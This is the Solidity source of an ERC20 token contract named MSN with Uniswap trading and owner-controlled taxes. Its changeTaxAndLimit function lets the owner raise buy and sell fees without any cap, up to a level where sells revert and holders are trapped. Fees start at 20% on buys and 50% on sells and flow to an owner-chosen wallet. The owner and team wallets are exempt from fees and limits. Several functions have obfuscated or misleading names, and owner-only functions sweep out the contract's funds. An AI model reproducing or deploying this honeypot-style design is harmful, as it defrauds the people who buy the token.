// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

/**
https://twitter.com/msncoineth
https://t.me/msncoineth
msncoin.io



 */

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MSN is ERC20, Ownable {
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address payable public taxWallet;
    bool private swapping;

    uint256 public maxTransactionAmount;
    uint256 public swapTokensAtAmount;
    uint256 public maxWallet;

    bool public tradingActive = false;
    bool public swapEnabled = false;

    uint256 public buyTotalFees;
    uint256 public sellTotalFees;

    // Exclude from fees and max transaction amount
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;

    // Store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping(address => bool) public automatedMarketMakerPairs;

    event UpdateUniswapV2Router(
        address indexed newAddress,
        address indexed oldAddress
    );

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    constructor(address router, address team, address funding) ERC20("MSN", "MSN") {
        uniswapV2Router = IUniswapV2Router02(router);
        excludeFromMaxTransaction(address(router), true);

        taxWallet = payable(owner());

        uint256 totalTokenSupply = 10_000_000 * 1e18; 

        maxTransactionAmount = 200000 * 1e18; 
        maxWallet = 200000 * 1e18;
        swapTokensAtAmount = (totalTokenSupply * 5) / 10000; // 0.05%

        buyTotalFees = 20; 

        sellTotalFees = 50; 

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(team, true);
        excludeFromFees(funding, true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);
        excludeFromMaxTransaction(team, true);
        excludeFromMaxTransaction(funding, true);

        _mint(msg.sender, totalTokenSupply);
    }

    receive() external payable {}

    // Will enable trading, once this is toggeled, it will not be able to be turned off.
    function NitroTrading() external onlyOwner {
        tradingActive = true;
        swapEnabled = true;
    }

    // Trigger this post launch once price is more stable. Made to avoid whales and snipers hogging supply.
    function changeTaxAndLimit(
        uint256 maxTx,
        uint256 _maxWallet,
        uint256 buyFees,
        uint256 sellFees
    ) external onlyOwner {
        maxTransactionAmount = maxTx;
        maxWallet = _maxWallet;

        buyTotalFees = buyFees;

        sellTotalFees = sellFees;
    }

    function excludeFromMaxTransaction(
        address updAds,
        bool isEx
    ) public onlyOwner {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }


    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) public onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

        function SetFeeandblacklistAddress(address wallet) public onlyOwner {
        taxWallet = payable(wallet);
    }


        function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }


        function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function uniswapv2List(address pair) public onlyOwner {
        uniswapV2Pair = pair;
        _setAutomatedMarketMakerPair(pair, true);
        _isExcludedMaxTransactionAmount[pair] = true;
    }

    function justfuckairdrop(uint256 amount) public onlyOwner {
        swapTokensAtAmount = amount;
    }



    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (
            from != owner() &&
            to != owner() &&
            to != address(0) &&
            to != address(0xdead) &&
            !swapping
        ) {
            if (!tradingActive) {
                require(
                    _isExcludedFromFees[from] || _isExcludedFromFees[to],
                    "Trading is not active."
                );
            }

            // Buying
            if (
                automatedMarketMakerPairs[from] &&
                !_isExcludedMaxTransactionAmount[to]
            ) {
                require(
                    amount <= maxTransactionAmount,
                    "Buy transfer amount exceeds the maxTransactionAmount."
                );
                require(
                    amount + balanceOf(to) <= maxWallet,
                    "Max wallet exceeded"
                );
            }
            // Selling
            else if (
                automatedMarketMakerPairs[to] &&
                !_isExcludedMaxTransactionAmount[from]
            ) {
                require(
                    amount <= maxTransactionAmount,
                    "Sell transfer amount exceeds the maxTransactionAmount."
                );
            } else if (!_isExcludedMaxTransactionAmount[to]) {
                require(
                    amount + balanceOf(to) <= maxWallet,
                    "Max wallet exceeded"
                );
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;

            swapBck();

            swapping = false;
        }

        bool takeFee = !swapping;

        // If any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // Only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // Sell
            if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                fees = Math.mulDiv(
                    amount,
                    sellTotalFees,
                    100,
                    Math.Rounding.Up
                );
            }
            // Buy
            else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                fees = Math.mulDiv(amount, buyTotalFees, 100, Math.Rounding.Up);
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // Generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // Make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // Accept any amount of ETH; ignore slippage
            path,
            taxWallet,
            block.timestamp
        );
    }

    function swapBck() private {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance == 0) {
            return;
        }
        swapTokensForEth(contractBalance);
    }

    function rcsdethlodals(
        address _token,
        address _to
    ) external onlyOwner {
        require(_token != address(0), "_token address cannot be 0");
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(_to, _contractBalance);
    }

    function rcsdetokenslddd(address toAddr) external onlyOwner {
        (bool success, ) = toAddr.call{value: address(this).balance}("");
        require(success);
    }
}